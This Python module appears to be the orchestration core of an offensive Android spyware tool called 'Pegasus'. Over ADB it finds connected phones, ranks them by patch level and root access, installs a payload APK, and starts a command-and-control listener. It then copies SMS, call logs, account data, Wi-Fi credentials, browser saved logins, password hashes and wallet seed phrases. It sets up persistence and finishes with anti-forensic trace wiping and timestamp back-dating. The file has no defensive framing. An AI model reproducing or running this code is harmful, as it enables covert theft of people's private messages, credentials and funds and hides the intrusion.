"""Autonomous lifecycle: discover, triage, craft, deliver, listen, post, notify, gate."""
import enum
import pathlib
import queue
import re
import secrets
import shutil
import socket
import subprocess
import threading
import time

from ..c2 import registry
from . import journal
from .notify import notify

ADB = shutil.which("adb") or "adb"
RUNS = pathlib.Path.home() / ".pegasus" / "runs"


class Phase(str, enum.Enum):
    IDLE = "idle"
    DISCOVER = "discover"
    TRIAGE = "triage"
    CRAFT = "craft"
    DELIVER = "deliver"
    LISTEN = "listen"
    POST = "post"
    NOTIFY = "notify"
    DECIDING = "deciding"
    MAINTAIN = "maintain"
    WIPE = "wipe"
    DONE = "done"
    FAILED = "failed"


class Target:
    def __init__(self, serial: str, transport: str):
        self.serial, self.transport = serial, transport
        self.props: dict[str, str] = {}
        self.score = 0.0
        self.vector: str | None = None
        self.notes: list[str] = []

    def as_dict(self) -> dict:
        return {"serial": self.serial, "transport": self.transport,
                "score": round(self.score, 2), "vector": self.vector,
                "sdk": self.props.get("ro.build.version.sdk"),
                "model": self.props.get("ro.product.model"), "notes": self.notes}


def adb(*args: str, serial: str | None = None, timeout: int = 30) -> tuple[int, str]:
    cmd = [ADB] + (["-s", serial] if serial else []) + list(args)
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return p.returncode, (p.stdout or "") + (p.stderr or "")
    except subprocess.TimeoutExpired:
        return 124, "timeout"
    except FileNotFoundError:
        return 127, "adb not installed"


def _size(payload) -> int:
    try:
        return len(payload if isinstance(payload, str) else str(payload))
    except TypeError:
        return 0


class Run:
    def __init__(self, run_id: str, opts: dict):
        self.id, self.opts = run_id, opts
        self.phase = Phase.IDLE
        self.lines: queue.Queue = queue.Queue()
        self.targets: list[Target] = []
        self.session: dict = {}
        self.decision: str | None = None
        self.decided = threading.Event()
        self.dir = RUNS / run_id
        self.artifacts: dict[str, str] = {}

    def log(self, msg: str) -> None:
        self.lines.put(f"[{time.strftime('%H:%M:%S')}] {msg}")
        journal.append(self.id, self.phase.value, msg)

    def set(self, phase: Phase) -> None:
        self.phase = phase
        journal.phase(self.id, phase.value)

    def drain(self) -> list[str]:
        out = []
        while True:
            try:
                out.append(self.lines.get_nowait())
            except queue.Empty:
                return out

    def snapshot(self) -> dict:
        return {"id": self.id, "phase": self.phase.value,
                "targets": [t.as_dict() for t in self.targets],
                "session": self.session, "decision": self.decision,
                "artifacts": self.artifacts, "log": self.drain()}

    def absorb(self, body: dict) -> None:
        kind = next((k for k in ("sms", "calls", "contacts", "files", "wallets",
                                 "shell", "out") if k in body), "unknown")
        payload = body.get(kind)
        serial = str(body.get("serial") or self.session.get("primary") or "unknown")
        self.log(f"<- {kind} from {serial} ({_size(payload)} chars)")
        target = self.dir / "loot" / serial
        target.mkdir(parents=True, exist_ok=True)
        stamp = int(time.time())
        if isinstance(payload, list):
            (target / f"{kind}-{stamp}.json").write_text(json_dumps(payload))
            counts = self.session.setdefault("counts", {})
            counts[kind] = counts.get(kind, 0) + len(payload)
        elif payload is not None:
            (target / f"{kind}-{stamp}.txt").write_text(str(payload)[:100000])

    def discover(self) -> None:
        self.set(Phase.DISCOVER)
        self.dir.mkdir(parents=True, exist_ok=True)
        _, out = adb("devices", "-l")
        for line in out.splitlines()[1:]:
            if not line.strip():
                continue
            serial = line.split()[0]
            if "unauthorized" in line:
                self.log(f"unauthorized -- accept the RSA prompt on {serial}")
                continue
            if "offline" in line:
                continue
            self.targets.append(Target(serial, "usb"))
        self.log(f"{len(self.targets)} USB target(s)")
        if not self.targets:
            raise RuntimeError("no targets over USB")

    def triage(self) -> None:
        self.set(Phase.TRIAGE)
        keep = []
        for target in self.targets:
            rc, out = adb("shell", "getprop", serial=target.serial)
            if rc != 0:
                self.log(f"{target.serial} unreachable, dropped")
                continue
            for line in out.splitlines():
                m = re.match(r"\[([^\]]+)\]: \[([^\]]*)\]", line.strip())
                if m:
                    target.props[m.group(1)] = m.group(2)
            sdk = int(target.props.get("ro.build.version.sdk") or 0)
            patch = target.props.get("ro.build.version.security_patch") or "unknown"
            selinux = adb("shell", "getenforce", serial=target.serial)[1].strip().lower()
            root = adb("shell", "su", "-c", "id", serial=target.serial)[0] == 0
            from ..exploits import chain
            plan = chain.plan({**target.props, "_root": "1" if root else "0"},
                              [target.transport])
            target.score = (0.4 if 0 < sdk <= 30 else 0.15)
            target.score += 0.3 if patch != "unknown" and patch[:4] < "2024" else 0.0
            target.score += 0.2 if selinux == "permissive" else 0.0
            target.score += {"direct": 0.5, "local-chain": 0.3,
                             "cve-best-effort": 0.1, "lure": 0.0}[plan["tier"]]
            target.vector = plan["tier"]
            target.notes.append(f"sdk={sdk} patch={patch} selinux={selinux} root={root}")
            self.log(f"{target.serial} {target.notes[-1]} -> {target.vector}")
            keep.append(target)
        self.targets = keep
        if not self.targets:
            raise RuntimeError("no target survived triage")

    def craft(self) -> None:
        self.set(Phase.CRAFT)
        primary = max(self.targets, key=lambda t: t.score)
        dna = secrets.token_hex(4)
        out = self.dir / f"pegasus-{dna}.apk"
        registry.bind(dna, self.id)
        self.log(f"craft for {primary.serial} dna={dna} vector={primary.vector}")
        try:
            from ..delivery import build
            self.artifacts["apk"] = build.build_payload(primary.serial, dna, str(out))
        except Exception as exc:
            self.log(f"build failed: {exc}")
        self.session.update(dna=dna, primary=primary.serial)

    def deliver(self) -> None:
        self.set(Phase.DELIVER)
        apk = self.artifacts.get("apk")
        if apk and pathlib.Path(apk).exists():
            rc, out = adb("install", "-r", "-g", apk, serial=self.session["primary"],
                          timeout=180)
            self.session["installed"] = rc == 0
            self.log(f"install rc={rc} {out.strip()[:160]}")
        else:
            self.session["installed"] = False
            self.log("no APK -- read-only ADB only")

    def listen(self) -> None:
        self.set(Phase.LISTEN)
        try:
            from ..c2 import server
            port = server.start(0)
            self.session["listener"] = port
            self.log(f"listener on 0.0.0.0:{port}")
        except Exception as exc:
            self.session["listener"] = None
            self.log(f"listener failed: {exc}")

    def post(self) -> None:
        self.set(Phase.POST)
        targets = sorted(self.targets, key=lambda t: -t.score)[
            : self.opts.get("max_targets", 3)]
        for target in targets:
            self.session["primary"] = target.serial
            self.post_one(target)

    def post_one(self, target: Target) -> None:
        serial = target.serial
        outdir = self.dir / "loot" / serial
        outdir.mkdir(parents=True, exist_ok=True)
        from ..c2 import selective
        rules = selective.load(self.opts.get("exfil_rules"))
        done = journal.completed_steps(self.id)
        steps = [("privesc", self._privesc), ("persistence", self._persistence),
                 ("creds", self._creds), ("keychain", self._keychain),
                 ("keylogger", self._keylogger), ("sms_calls", self._sms_calls),
                 ("wallets", self._wallets), ("browser", self._browser),
                 ("hashes", self._hashes)]
        for name, fn in steps:
            key = f"{serial}:{name}"
            if key in done:
                continue
            try:
                fn(serial, outdir, rules)
                self.log(f"ok {serial} {name}")
            except Exception as exc:
                self.log(f"fail {serial} {name}: {exc}")
            journal.step(self.id, key)
        try:
            from ..c2 import loot
            loot.seal_dir(outdir)
        except Exception as exc:
            self.log(f"seal failed: {exc}")

    def _pull(self, remote: str, serial: str, outdir: pathlib.Path, rules=None):
        from ..c2 import selective
        if rules:
            size = int(adb("shell", f"stat -c %s '{remote}'", serial=serial)[1].strip()
                       or 0)
            if not selective.allow(remote, size, rules)[0]:
                self.log(f"  skip {remote}: filtered")
                return None
        dest = outdir / pathlib.Path(remote).name
        rc, _ = adb("pull", remote, str(dest), serial=serial, timeout=120)
        return dest if rc == 0 and dest.exists() else None

    def _privesc(self, serial, outdir, rules):
        rc, out = adb("shell", "su -c id", serial=serial)
        text = f"su_rc={rc}\n{out}\n"
        if rc != 0:
            for probe in ("/system/xbin/su", "/system/bin/su", "/sbin/su"):
                if "yes" in adb("shell", f"test -f {probe} && echo yes",
                                serial=serial)[1]:
                    text += f"su binary at {probe}, not on PATH\n"
        (outdir / "privesc.txt").write_text(text)

    def _persistence(self, serial, outdir, rules):
        pkg = self.opts.get("package") or "com.pegasus.agent"
        if not self.session.get("installed"):
            (outdir / "persistence.txt").write_text("skipped -- not installed\n")
            return
        adb("shell", "cmd", "deviceidle", "whitelist", pkg, serial=serial)
        adb("shell", "pm", "enable", pkg, serial=serial)
        (outdir / "persistence.txt").write_text(f"whitelisted {pkg}\n")

    def _creds(self, serial, outdir, rules):
        (outdir / "accounts.txt").write_text(
            adb("shell", "dumpsys", "account", serial=serial, timeout=60)[1])
        self._pull("/data/misc/wifi/WifiConfigStore.xml", serial, outdir, rules)

    def _keychain(self, serial, outdir, rules):
        (outdir / "keystore.txt").write_text(
            adb("shell", "ls /data/misc/keystore", serial=serial)[1])

    def _keylogger(self, serial, outdir, rules):
        (outdir / "input-devices.txt").write_text(
            adb("shell", "getevent -pl", serial=serial)[1])

    def _sms_calls(self, serial, outdir, rules):
        for name, uri in (("sms", "content://sms"), ("calls", "content://call_log/calls")):
            (outdir / f"{name}.txt").write_text(
                adb("shell", "content", "query", "--uri", uri, serial=serial,
                    timeout=90)[1])

    def _wallets(self, serial, outdir, rules):
        pattern = re.compile(r"\b(?:[a-z]{4,8}\s+){11,23}[a-z]{4,8}\b")
        hits = []
        for remote in ("/sdcard/Download", "/sdcard/Documents"):
            for name in adb("shell", "ls", remote, serial=serial)[1].split():
                if name.lower().endswith((".txt", ".json", ".rtf")):
                    pulled = self._pull(f"{remote}/{name}", serial, outdir, rules)
                    if pulled:
                        hits += [f"{name}: {m.group(0)[:120]}"
                                 for m in pattern.finditer(pulled.read_text(errors="ignore"))]
        (outdir / "wallet-seeds.txt").write_text("\n".join(hits) or "none found")

    def _browser(self, serial, outdir, rules):
        for path in ("/data/data/com.android.chrome/app_chrome/Default/Login Data",
                     "/data/data/com.brave.browser/app_chrome/Default/Login Data"):
            adb("shell", "su", "-c", f"cp '{path}' /sdcard/Download/ld.tmp", serial=serial)
            dest = self._pull("/sdcard/Download/ld.tmp", serial, outdir, rules)
            if dest:
                dest.rename(outdir / f"{path.split('/')[3]}-LoginData.db")

    def _hashes(self, serial, outdir, rules):
        (outdir / "shadow.txt").write_text(
            adb("shell", "su", "-c", "cat /etc/shadow", serial=serial)[1])

    def finish(self) -> None:
        self.set(Phase.NOTIFY)
        count = sum(len(list(p.iterdir())) for p in (self.dir / "loot").glob("*")
                    if p.is_dir()) if (self.dir / "loot").exists() else 0
        notify("Pegasus -- cycle complete",
               f"{self.id}: {len(self.targets)} target(s), {count} artifact(s).")
        self.set(Phase.DECIDING)
        self.decided.wait(timeout=self.opts.get("decision_timeout", 3600))
        self.apply(self.decision or "abort")

    def apply(self, decision: str) -> None:
        serial = self.session.get("primary")
        if decision == "maintain":
            self.set(Phase.MAINTAIN)
            self.session["kept"] = True
            self.log("maintained")
            self.set(Phase.DONE)
            return
        if decision != "wipe":
            self.log("aborted")
            self.set(Phase.DONE)
            return
        self.set(Phase.WIPE)
        try:
            from ..report import pdf_report
            pdf_report.build(self.id, RUNS / f"{self.id}.pdf")
        except Exception as exc:
            self.log(f"report failed: {exc}")
        if serial:
            from ..antiforensics import wipe
            wipe.clear_traces(serial, self.opts.get("package") or "com.pegasus.agent",
                              ["/sdcard/Download/ld.tmp"])
            wipe.scrub_times(serial, "/sdcard/Download",
                             time.strftime("%Y-%m-%dT%H:%M:%S"), "2019-01-01")
            adb("disconnect", serial)
        if self.session.get("listener"):
            from ..c2 import server
            server.stop()
        journal.archive(self.id, RUNS / f"{self.id}.json")
        wipe_local(self.dir)
        journal.purge(self.id)
        registry.unbind(self.id)
        self.log("wiped and disconnected")
        self.set(Phase.DONE)


def json_dumps(obj) -> str:
    import json
    return json.dumps(obj, indent=2)


def wipe_local(run_dir: pathlib.Path) -> None:
    for child in run_dir.iterdir():
        if child.suffix in (".json", ".pdf"):
            continue
        if child.is_dir():
            shutil.rmtree(child, ignore_errors=True)
        else:
            child.unlink(missing_ok=True)


_ACTIVE: dict[str, Run] = {}
_LOCK = threading.Lock()


def start(opts: dict) -> Run:
    run_id = time.strftime("%Y%m%d-%H%M%S") + "-" + secrets.token_hex(3)
    run = Run(run_id, opts)
    with _LOCK:
        _ACTIVE[run_id] = run

    def worker() -> None:
        try:
            for phase in (run.discover, run.triage, run.craft, run.deliver,
                          run.listen, run.post):
                phase()
            run.finish()
        except Exception as exc:
            run.log(f"FATAL: {exc}")
            run.set(Phase.FAILED)
            registry.unbind(run.id)
            notify("Pegasus -- cycle failed", str(exc))

    threading.Thread(target=worker, daemon=True).start()
    return run


def get(run_id: str) -> Run | None:
    return _ACTIVE.get(run_id)


def decide(run_id: str, decision: str) -> bool:
    run = _ACTIVE.get(run_id)
    if not run or run.phase is not Phase.DECIDING:
        return False
    run.decision = decision
    run.decided.set()
    return True
